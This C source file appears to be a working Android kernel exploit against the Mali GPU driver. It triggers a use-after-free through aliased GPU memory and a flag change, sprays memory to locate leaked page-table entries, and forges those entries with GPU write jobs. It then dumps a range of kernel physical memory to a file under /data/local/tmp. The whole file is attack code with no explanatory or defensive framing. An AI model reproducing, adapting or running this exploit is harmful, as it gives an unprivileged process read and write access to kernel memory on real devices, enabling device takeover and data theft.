#include <stdio.h>
#include <stdarg.h>
#include <errno.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdlib.h>
#include <signal.h>
#include <poll.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#define PAGE_SHIFT 12
#define CHUNK_SIZE (2UL << 20)
#define CHUNKS 15360UL
#define NATIVE_SIZE (32UL << 20)

struct kbase_ioctl_version_check { uint16_t major; uint16_t minor; };
struct kbase_ioctl_set_flags { uint32_t create_flags; };
union kbase_ioctl_mem_alloc {
    struct { uint64_t va_pages; uint64_t commit_pages; uint64_t extent; uint64_t flags; } in;
    struct { uint64_t flags; uint64_t gpu_va; } out;
};
union kbase_ioctl_mem_alias {
    struct { uint64_t flags; uint64_t stride; uint64_t nents; uint64_t aliasing_info; } in;
    struct { uint64_t flags; uint64_t gpu_va; uint64_t va_pages; } out;
};
struct base_mem_handle { struct { uint64_t handle; } basep; };
struct base_mem_aliasing_info { struct base_mem_handle handle; uint64_t offset; uint64_t length; };
struct kbase_ioctl_mem_flags_change { uint64_t gpu_va; uint64_t flags; uint64_t mask; };
struct kbase_ioctl_job_submit { uint64_t addr; uint32_t nr_atoms; uint32_t stride; };
struct base_dependency { uint8_t atom_id; uint8_t dependency_type; };
struct base_jd_atom_v2 {
    uint64_t jc; uint64_t udata[2]; uint64_t extres_list;
    uint16_t nr_extres; uint16_t compat_core_req;
    struct base_dependency pre_dep[2];
    uint8_t atom_number, prio, device_nr, padding;
    uint32_t core_req;
};
struct base_jd_event_v2 { uint32_t event_code; uint8_t atom_number; uint8_t _pad[3]; uint64_t udata[2]; };

#define BASE_MEM_MAP_TRACKING_HANDLE (3ull << 12)
#define BASE_MEM_PROT_CPU_RD (1ull << 0)
#define BASE_MEM_PROT_CPU_WR (1ull << 1)
#define BASE_MEM_PROT_GPU_RD (1ull << 2)
#define BASE_MEM_PROT_GPU_WR (1ull << 3)
#define BASE_MEM_SAME_VA (1ull << 13)
#define BASE_MEM_DONT_NEED (1ull << 17)
#define BASE_MEM_COHERENT_SYSTEM (1ull << 10)
#define BASE_MEM_COHERENT_LOCAL (1ull << 11)
#define BASE_MEM_FLAGS_MODIFIABLE (BASE_MEM_DONT_NEED | BASE_MEM_COHERENT_SYSTEM | BASE_MEM_COHERENT_LOCAL)

#define KBASE_IOCTL_TYPE 0x80
#define KBASE_IOCTL_VERSION_CHECK _IOWR(KBASE_IOCTL_TYPE, 0, struct kbase_ioctl_version_check)
#define KBASE_IOCTL_SET_FLAGS _IOW(KBASE_IOCTL_TYPE, 1, struct kbase_ioctl_set_flags)
#define KBASE_IOCTL_JOB_SUBMIT _IOW(KBASE_IOCTL_TYPE, 2, struct kbase_ioctl_job_submit)
#define KBASE_IOCTL_MEM_ALLOC _IOWR(KBASE_IOCTL_TYPE, 5, union kbase_ioctl_mem_alloc)
#define KBASE_IOCTL_MEM_ALIAS _IOWR(KBASE_IOCTL_TYPE, 21, union kbase_ioctl_mem_alias)
#define KBASE_IOCTL_MEM_FLAGS_CHANGE _IOW(KBASE_IOCTL_TYPE, 23, struct kbase_ioctl_mem_flags_change)

#define PTE_ADDR_MASK ((1ULL << 48) - 1)
#define MARKER(i) (0x5054450000000000ULL | (uint64_t)(i))
#define THRASH_SIZE (96UL << 20)

#define KPHYS_BASE 0x80080000ULL
#define RD_OFF_START 0xDE0000ULL
#define RD_OFF_END 0x10CD000ULL
#define RD_PAGES ((RD_OFF_END - RD_OFF_START) >> 12)
#define ALIAS_PAGES (NATIVE_SIZE >> 12)

static int logfd = -1;
static void logmsg(const char *fmt, ...) {
    char buf[400];
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(buf, sizeof(buf), fmt, ap);
    va_end(ap);
    if (n > 0) { write(1, buf, n); if (logfd >= 0) { write(logfd, buf, n); fsync(logfd); } }
}
static void crash_handler(int sig, siginfo_t *si, void *ctx) {
    (void)ctx;
    logmsg("[!] signal %d addr=%p\n", sig, si->si_addr);
    _exit(128 + sig);
}

static int fd;
static void *jc_page;
static unsigned char *thrash_buf;

static void thrash(void) {
    volatile unsigned char sink = 0;
    for (size_t i = 0; i < THRASH_SIZE; i += 64) sink ^= thrash_buf[i];
    if (sink == 0xff) logmsg("[i] thrash sink weird\n");
}

static void *map_gpu(unsigned pages) {
    union kbase_ioctl_mem_alloc ma;
    memset(&ma, 0, sizeof(ma));
    ma.in.flags = BASE_MEM_SAME_VA | BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_CPU_WR | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    ma.in.va_pages = pages;
    ma.in.commit_pages = pages;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALLOC, &ma) < 0) { logmsg("[-] alloc: %s\n", strerror(errno)); return NULL; }
    void *r = mmap(NULL, pages << 12, PROT_READ | PROT_WRITE, MAP_SHARED, fd, ma.out.gpu_va);
    if (r == MAP_FAILED) { logmsg("[-] mmap: %s\n", strerror(errno)); return NULL; }
    return r;
}

static void pack_header(uint32_t *cl, uint32_t type, uint64_t next) {
    cl[0]=0; cl[1]=0; cl[2]=0; cl[3]=0;
    cl[4] = 1 | (type << 1);
    cl[5] = 0;
    cl[6] = (uint32_t)next; cl[7] = (uint32_t)(next >> 32);
}
struct write_value_payload { uint64_t address, type, immediate_value; };

static uint32_t submit_write(uint64_t target_va, uint64_t value) {
    if (!jc_page) { jc_page = map_gpu(1); if (!jc_page) return 0xffffffffu; }
    void *jc = jc_page;
    memset(jc, 0, 0x1000);
    pack_header((uint32_t *)jc, 2, 0);
    struct write_value_payload pl = { target_va, 7, value };
    memcpy((uint32_t *)jc + 8, &pl, sizeof(pl));
    struct base_jd_atom_v2 atom;
    memset(&atom, 0, sizeof(atom));
    atom.jc = (uint64_t)jc;
    atom.atom_number = 1;
    atom.core_req = 0x2;
    struct kbase_ioctl_job_submit js = { (uint64_t)&atom, 1, sizeof(atom) };
    if (ioctl(fd, KBASE_IOCTL_JOB_SUBMIT, &js) < 0) { logmsg("[-] submit: %s\n", strerror(errno)); return 0xfffffffeu; }
    struct pollfd pfd = { fd, POLLIN, 0 };
    if (poll(&pfd, 1, 3000) <= 0) { logmsg("[-] poll timeout\n"); return 0xffffffddu; }
    struct base_jd_event_v2 ev;
    if (read(fd, &ev, sizeof(ev)) < (int)sizeof(ev)) { logmsg("[-] event read\n"); return 0xfffffffcu; }
    return ev.event_code;
}

static int cleanup_line(uint64_t alias_page, int L) {
    for (int attempt = 0; attempt < 10; attempt++) {
        thrash();
        for (int j = 0; j < 8; j++) submit_write(alias_page + (size_t)(L * 8 + j) * 8, 0);
        uint64_t *ep = (uint64_t *)alias_page;
        int ok = 1;
        for (int j = 0; j < 8; j++) if (ep[L * 8 + j] != 0) { ok = 0; break; }
        if (ok) { thrash(); return 1; }
    }
    logmsg("[!] cleanup FAILED line %d\n", L);
    return 0;
}

struct cand {
    size_t pg;
    uint64_t idx;
    uint64_t high, low;
    uint64_t alias_page;
    unsigned char *chunk_va;
    int la, lb;
    int lines[64];
    int nf;
    int cursor;
};

static struct cand cur;
static int have_cand = 0;
static int used_pg[ALIAS_PAGES];
static size_t scan_pg = 0;
static void *alias_ro;

static int find_candidate(void) {
    for (; scan_pg < ALIAS_PAGES; scan_pg++) {
        size_t pg = scan_pg;
        if (used_pg[pg]) continue;
        uint64_t *e = (uint64_t *)((char *)alias_ro + (pg << 12));
        int nz = 0, s0 = -1, s1 = -1, bad = 0;
        for (int s = 0; s < 512; s++) {
            uint64_t v = e[s];
            if (!v) continue;
            nz++;
            if (nz > 2) { bad = 1; break; }
            if (s0 < 0) s0 = s; else s1 = s;
        }
        if (bad || nz != 2) continue;
        uint64_t v0 = e[s0], v1 = e[s1];
        if ((v0 & 0x3) != 0x3 || (v1 & 0x3) != 0x3) continue;
        unsigned a_slot, b_slot;
        if (s0 >= 32 && s1 < 32) { a_slot = s0; b_slot = s1; }
        else if (s1 >= 32 && s0 < 32) { a_slot = s1; b_slot = s0; }
        else continue;
        uint64_t idx = (uint64_t)b_slot * 480 + (a_slot - 32);
        if (idx >= CHUNKS) continue;
        uint64_t a_val = (s0 == (int)a_slot) ? v0 : v1;
        unsigned char *chunk_va = (unsigned char *)((uintptr_t)0 + 0);
        (void)chunk_va;
        extern unsigned char *chunk_base;
        unsigned char *cv = chunk_base + idx * CHUNK_SIZE;
        if (*(volatile uint64_t *)(cv + (size_t)a_slot * 0x1000) != MARKER(idx)) continue;
        used_pg[pg] = 1;
        memset(&cur, 0, sizeof(cur));
        cur.pg = pg;
        cur.idx = idx;
        cur.high = a_val & ~PTE_ADDR_MASK;
        cur.low = a_val & 0xfffULL;
        cur.alias_page = (uint64_t)alias_ro + (pg << 12);
        cur.chunk_va = cv;
        cur.la = (int)(a_slot >> 3);
        cur.lb = (int)(b_slot >> 3);
        for (int L = 0; L < 64; L++) if (L != cur.la && L != cur.lb) cur.lines[cur.nf++] = L;
        cur.cursor = 0;
        have_cand = 1;
        logmsg("[+] cand pg=0x%zx i=%llu slots=%u/%u lines=%d/%d high=0x%llx low=0x%llx\n",
               pg << 12, (unsigned long long)idx, a_slot, b_slot, cur.la, cur.lb,
               (unsigned long long)cur.high, (unsigned long long)cur.low);
        scan_pg++;
        return 1;
    }
    return 0;
}

unsigned char *chunk_base;

int main(void) {
    logfd = open("/data/local/tmp/mali_kdump.log", O_WRONLY | O_CREAT | O_TRUNC | O_SYNC, 0644);
    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = crash_handler;
    sa.sa_flags = SA_SIGINFO;
    sigaction(SIGSEGV, &sa, NULL);
    sigaction(SIGBUS, &sa, NULL);
    signal(SIGPIPE, SIG_IGN);

    logmsg("[*] kdump pid=%d off=0x%llx..0x%llx pages=%llu\n", getpid(),
           (unsigned long long)RD_OFF_START, (unsigned long long)RD_OFF_END,
           (unsigned long long)RD_PAGES);
    unsigned long affinity = 1;
    long pr = syscall(SYS_sched_setaffinity, 0, sizeof(affinity), &affinity);
    logmsg("[i] pin cpu0 ret=%ld errno=%d\n", pr, errno);
    thrash_buf = mmap(NULL, THRASH_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (thrash_buf == MAP_FAILED) { logmsg("[-] thrash mmap: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < THRASH_SIZE; o += 0x1000) thrash_buf[o] = (unsigned char)(o >> 12);
    thrash();

    fd = open("/dev/mali0", O_RDWR);
    if (fd < 0) { logmsg("[-] open: %s\n", strerror(errno)); return 1; }
    struct kbase_ioctl_version_check vc = { 999, 999 };
    ioctl(fd, KBASE_IOCTL_VERSION_CHECK, &vc);
    struct kbase_ioctl_set_flags sf = { 0 };
    if (ioctl(fd, KBASE_IOCTL_SET_FLAGS, &sf) < 0) { logmsg("[-] setflags: %s\n", strerror(errno)); return 1; }
    mmap(NULL, NATIVE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, BASE_MEM_MAP_TRACKING_HANDLE);

    void *native = map_gpu(NATIVE_SIZE >> PAGE_SHIFT);
    if (!native) return 1;
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) *(volatile uint64_t *)((char *)native + o) = 0x5a5a000000000000ULL | (o >> 12);

    union kbase_ioctl_mem_alias al;
    struct base_mem_aliasing_info ai;
    memset(&al, 0, sizeof(al)); memset(&ai, 0, sizeof(ai));
    al.in.nents = 1;
    al.in.stride = NATIVE_SIZE >> PAGE_SHIFT;
    al.in.flags = BASE_MEM_PROT_CPU_RD | BASE_MEM_PROT_GPU_RD | BASE_MEM_PROT_GPU_WR;
    ai.handle.basep.handle = (uint64_t)native;
    ai.length = NATIVE_SIZE >> PAGE_SHIFT;
    al.in.aliasing_info = (uint64_t)&ai;
    if (ioctl(fd, KBASE_IOCTL_MEM_ALIAS, &al) < 0) { logmsg("[-] alias: %s\n", strerror(errno)); return 1; }

    struct kbase_ioctl_mem_flags_change fc;
    fc.gpu_va = (uint64_t)native;
    fc.mask = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    fc.flags = BASE_MEM_FLAGS_MODIFIABLE | BASE_MEM_DONT_NEED;
    if (ioctl(fd, KBASE_IOCTL_MEM_FLAGS_CHANGE, &fc) < 0) { logmsg("[-] flags_change: %s\n", strerror(errno)); return 1; }

    alias_ro = mmap(NULL, NATIVE_SIZE, PROT_READ, MAP_SHARED, fd, al.out.gpu_va);
    if (alias_ro == MAP_FAILED) { logmsg("[-] alias mmap: %s\n", strerror(errno)); return 1; }
    for (size_t o = 0; o < NATIVE_SIZE; o += 0x1000) (void)*(volatile uint64_t *)((char *)alias_ro + o);
    logmsg("[+] UAF armed + alias prefaulted\n");

    size_t total = CHUNKS * CHUNK_SIZE + CHUNK_SIZE;
    unsigned char *raw = mmap(NULL, total, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (raw == MAP_FAILED) { logmsg("[-] chunk area: %s\n", strerror(errno)); return 1; }
    uintptr_t base = ((uintptr_t)raw + CHUNK_SIZE - 1) & ~(uintptr_t)(CHUNK_SIZE - 1);
    chunk_base = (unsigned char *)base;
    logmsg("[+] chunk base=0x%lx span=%luMB\n", (unsigned long)base, (CHUNKS * CHUNK_SIZE) >> 20);

    for (size_t i = 0; i < CHUNKS; i++) {
        unsigned slot_a = 32 + (unsigned)(i % 480);
        unsigned slot_b = (unsigned)((i / 480) % 32);
        unsigned char *p = (unsigned char *)(base + i * CHUNK_SIZE);
        *(volatile uint64_t *)(p + (size_t)slot_a * 0x1000) = MARKER(i);
        *(volatile uint64_t *)(p + (size_t)slot_b * 0x1000) = MARKER(i) ^ 0x1111111111111111ULL;
    }
    logmsg("[+] spray done\n");

    int out = open("/data/local/tmp/kallsyms_region.bin", O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (out < 0) { logmsg("[-] out open: %s\n", strerror(errno)); return 1; }

    uint64_t groups = (RD_PAGES + 7) / 8;
    int done = 0;
    for (uint64_t g = 0; g < groups; g++) {
        uint64_t first_page = g * 8;
        int npages = (int)(RD_PAGES - first_page);
        if (npages > 8) npages = 8;
        int served = 0;
        for (int attempt = 0; attempt < 30 && !served; attempt++) {
            if (!have_cand || cur.cursor >= cur.nf) {
                have_cand = 0;
                if (!find_candidate()) { logmsg("[-] no more candidates at group %llu\n", (unsigned long long)g); break; }
            }
            int L = cur.lines[cur.cursor++];
            uint64_t ptes[8];
            int ok = 1;
            thrash();
            for (int j = 0; j < npages; j++) {
                uint64_t off = RD_OFF_START + (first_page + (uint64_t)j) * 0x1000;
                uint64_t phys = KPHYS_BASE + off;
                ptes[j] = cur.high | (phys & ~0xfffULL) | cur.low;
                uint32_t ev = submit_write(cur.alias_page + (size_t)(L * 8 + j) * 8, ptes[j]);
                if (ev != 1) { logmsg("[-] submit ev=0x%x g=%llu L=%d j=%d\n", ev, (unsigned long long)g, L, j); ok = 0; }
            }
            if (ok) {
                uint64_t *ep = (uint64_t *)alias_ro;
                for (int j = 0; j < npages; j++)
                    if (ep[cur.pg * 512 + L * 8 + j] != ptes[j]) { ok = 0; break; }
            }
            if (!ok) {
                cleanup_line(cur.alias_page, L);
                continue;
            }
            for (int j = 0; j < npages; j++) {
                unsigned char page[0x1000];
                memcpy(page, cur.chunk_va + (size_t)(L * 8 + j) * 0x1000, 0x1000);
                if (write(out, page, 0x1000) != 0x1000) { logmsg("[-] write out\n"); ok = 0; break; }
            }
            if (!cleanup_line(cur.alias_page, L)) {
                logmsg("[!] refusing to exit with dirty line; sleeping\n");
                for (;;) sleep(3600);
            }
            if (!ok) break;
            served = 1;
            if ((g % 16) == 0) {
                fsync(out);
                logmsg("[i] group %llu/%llu pg=0x%zx L=%d\n", (unsigned long long)g, (unsigned long long)groups, cur.pg << 12, L);
            }
        }
        if (!served) { logmsg("[-] failed group %llu\n", (unsigned long long)g); break; }
        done = (g + 1 == groups);
    }
    fsync(out);
    close(out);
    logmsg("[%c] done groups=%llu pages=%llu\n", done ? '+' : '-', (unsigned long long)groups, (unsigned long long)RD_PAGES);
    return done ? 0 : 1;
}
